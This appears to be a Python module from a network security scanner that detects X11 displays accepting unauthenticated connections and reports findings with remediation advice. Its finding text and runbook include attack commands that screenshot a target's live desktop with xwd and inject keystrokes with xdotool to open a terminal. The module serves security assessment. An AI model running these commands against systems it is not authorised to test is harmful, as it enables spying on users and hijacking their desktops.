"""X11 (6000-6009/tcp): unauthenticated display access.

An X server that accepts a connection from an untrusted client is game over on
that desktop: keystrokes, screenshots, synthetic input. The one-shot check is
the initial byte-order + MAJOR_PROTOCOL_VERSION handshake — an X server that
would accept an authenticated client on this segment responds; one gated by
xhost/xauth refuses with a specific reason string in the handshake reply.

Wire format: X protocol §8 (connection setup). Stdlib socket + struct.
"""
from __future__ import annotations

import socket
import struct

from ..core.models import Host, Port


_DEFAULT_PORT = 6000
_TIMEOUT = 3.0


def is_x11(port: Port) -> bool:
    svc = (port.service or "").lower()
    return 6000 <= port.portid <= 6009 or svc.startswith("x11")


def probe(ip: str, port: int = _DEFAULT_PORT, timeout: float = _TIMEOUT) -> dict:
    """Handshake with an empty authentication protocol name.

    An X server with no access control (xhost + / -nolisten missing) returns
    status=1 (accepted) plus a full server info block. One protected by MIT-
    MAGIC-COOKIE returns status=0 (refused) with an explanatory reason string
    such as 'No protocol specified' — that itself is the discovery signal
    since a non-X port never returns either shape.
    """
    out: dict = {"reachable": False}
    # Byte-order 'B' (0x42, big-endian) + pad + major(11) + minor(0) + name/data lengths(0) + pad
    req = struct.pack(">BBHHHH", 0x42, 0, 11, 0, 0, 0) + b"\x00\x00"
    try:
        s = socket.create_connection((ip, port), timeout=timeout)
    except OSError:
        return out
    try:
        s.settimeout(timeout)
        s.sendall(req)
        hdr = s.recv(8)
    except OSError:
        s.close()
        return out
    finally:
        try:
            s.close()
        except OSError:
            pass
    if len(hdr) < 8:
        return out
    status, extra_len, major, minor, addl = struct.unpack(">BBHHH", hdr)
    out["reachable"] = True
    out["major"] = major
    out["minor"] = minor
    if status == 1:
        out["accepted"] = True
    elif status == 0:
        # reason bytes may follow the header; just knowing status=0 is enough
        out["accepted"] = False
        out["refused_reason_len"] = extra_len
    else:
        out["accepted"] = False
        out["status"] = status
    return out


def x11_targets(hosts: list[Host]) -> list[dict]:
    out = []
    for h in hosts:
        for p in h.open_ports:
            if is_x11(p):
                out.append({"ip": h.ip, "port": p.portid,
                            "version": f"{p.product} {p.version}".strip()})
    return out


def _finding(sev, title, target, detail, tool, cmd, rem, cwes, kind="",
             exploit_note="", depth_tier=""):
    return {"severity": sev, "title": title, "target": target, "detail": detail,
            "tool": tool, "command": cmd, "remediation": rem,
            "cwes": cwes, "kind": kind,
            "exploit_note": exploit_note, "depth_tier": depth_tier}


def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
    probes = probes or {}
    out: list[dict] = []
    for h in hosts:
        for p in h.open_ports:
            if not is_x11(p):
                continue
            pr = probes.get((h.ip, p.portid))
            if not pr or not pr.get("reachable"):
                continue
            tgt = f"{h.ip}:{p.portid}"
            display = f":{p.portid - 6000}"
            if pr.get("accepted"):
                out.append(_finding(
                    "critical",
                    "X11 display accepts unauthenticated connections", tgt,
                    f"The X server on {tgt} answered the initial handshake with "
                    f"status=Success and no authentication challenge (X protocol "
                    f"{pr.get('major')}.{pr.get('minor')}). Any client on this "
                    f"segment can read the framebuffer (screenshot), record "
                    f"keystrokes and inject synthetic input against display "
                    f"{display} on {h.ip}.",
                    "xdotool / xwd / xspy",
                    f"DISPLAY={h.ip}{display} xwd -root -out /tmp/screen.xwd && "
                    f"convert /tmp/screen.xwd /tmp/screen.png   # screenshot the "
                    f"target's live desktop",
                    "Run X with -nolisten tcp (or the equivalent xorg.conf.d "
                    "override); if remote X is required, prefer SSH X11 "
                    "forwarding and require MIT-MAGIC-COOKIE.",
                    ["CWE-306", "CWE-284"], kind="x11_open",
                    exploit_note=(
                        "DISPLAY=<ip>:<display> xwd -root -out /tmp/scr.xwd "
                        "&& convert /tmp/scr.xwd /tmp/scr.png; then "
                        "DISPLAY=<ip>:<display> xdotool key ctrl+alt+t   "
                        "# spawn a terminal on the target's live desktop"),
                    depth_tier="t1"))
            else:
                # A refused handshake still confirms the port is X; useful for
                # discovery but not a finding on its own beyond low disclosure.
                out.append(_finding(
                    "low",
                    "X11 server present (authentication required)", tgt,
                    f"X protocol {pr.get('major', '?')}.{pr.get('minor', '?')} "
                    f"listener on {tgt} — refused the handshake, so xauth cookies "
                    f"or xhost restriction is in place. Still discloses that a "
                    f"desktop session is available on this host.",
                    "xdpyinfo",
                    f"DISPLAY={h.ip}{display} xdpyinfo   # will fail without a cookie",
                    "Restrict 6000-6009/tcp to trusted networks; if not required, "
                    "prefer -nolisten tcp.",
                    ["CWE-200"], kind="x11_present"))
    return out


def runbook(ip: str, port: int = _DEFAULT_PORT) -> list[dict]:
    display = f":{port - 6000}"
    return [
        {"phase": "enumerate", "tool": "xdpyinfo",
         "command": f"DISPLAY={ip}{display} xdpyinfo   # only works when access is open",
         "why": "confirm the display is reachable + read screen dimensions"},
        {"phase": "exploit", "tool": "xwd",
         "command": f"DISPLAY={ip}{display} xwd -root -out screen.xwd",
         "why": "one-shot screenshot of the target's live desktop"},
        {"phase": "exploit", "tool": "xdotool",
         "command": f"DISPLAY={ip}{display} xdotool key ctrl+alt+t",
         "why": "synthetic input — start a terminal on the target's desktop"},
    ]


def findings_to_vulns(fs: list[dict]) -> dict:
    from . import svccommon
    return svccommon.findings_to_vulns(fs, "x11", _DEFAULT_PORT)


def analyze(hosts: list[Host], creds: dict | None = None, active: bool = True,
            budget: float | None = None, progress=None) -> dict:
    from . import svcprobe
    targets = x11_targets(hosts)
    probes: dict = {}
    state: dict = {}
    if active:
        for t, pr in svcprobe.iter_probe(
                targets, lambda t: probe(t["ip"], t["port"]),
                budget=budget, progress=progress, state=state):
            if pr:
                probes[(t["ip"], t["port"])] = pr
                t["reachable"] = pr.get("reachable", False)
                t["accepted"] = pr.get("accepted", False)
    fs = findings(hosts, probes)
    runbooks = [{"target": f"{t['ip']}:{t['port']}", "ip": t["ip"],
                 "credfree": runbook(t["ip"], t["port"]), "credentialed": []}
                for t in targets]
    return {"targets": targets, "findings": fs, "runbooks": runbooks,
            "probes": {f"{k[0]}:{k[1]}": v for k, v in probes.items()},
            "stats": {"targets": len(targets), "findings": len(fs),
                      "stopped": state.get("stopped")}}
